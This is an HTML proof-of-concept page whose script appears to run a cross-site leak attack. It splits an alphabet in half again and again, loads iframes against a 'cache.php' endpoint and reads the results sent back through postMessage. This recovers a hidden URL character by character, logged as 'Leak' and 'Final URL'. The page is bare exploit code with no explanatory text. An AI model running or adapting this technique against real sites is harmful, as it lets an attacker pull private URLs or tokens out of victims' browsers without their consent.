<!DOCTYPE html>
<html>
	<head>
		<title>PoC</title>
	</head>
        <body>
			<script>
				const tryPattern = (patternA, patternB, prefix) => {
					let iframe = document.createElement("iframe");
					iframe.id  = patternA;
					iframe.src = `cache.php?patternA=${patternA}&patternB=${patternB}&prefix=${prefix}`;
					document.body.appendChild(iframe);      
                }

				const splitArray = (alphabet) => {
					let mid = Math.floor(alphabet.length / 2);
					let firstHalf = alphabet.slice(0, mid);
					let secondHalf = alphabet.slice(mid, alphabet.length);
					return [firstHalf, secondHalf];
				}

				const start = (prefix) => {
					let alphabet = "-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$";
					tryPattern(splitArray(alphabet)[0], splitArray(alphabet)[1], prefix || '');
                }
                        
				onmessage = (evt) => {
					let { patternA, patternB, prefix, match } = evt.data;
					let elem = document.getElementById(patternA);
                    elem.parentNode.removeChild(elem);

                    if (patternA === "$" || patternB === "$") {
						console.log("Final URL => ", prefix);
					} else if (patternA.length === 1 && match) {
						console.log(`Leak => ${prefix}`);
						start(prefix + patternA);
					} else if (patternB.length === 1 && !match) {
						console.log(`Leak => ${prefix}`);
						start(prefix + patternB);
					} else if (match) {
						tryPattern(splitArray(patternA)[0], splitArray(patternA)[1], prefix);
					} else {
						tryPattern(splitArray(patternB)[0], splitArray(patternB)[1], prefix);
					}
				}

				onload = () => {
					start();
				}
		</script>
    </body>
</html>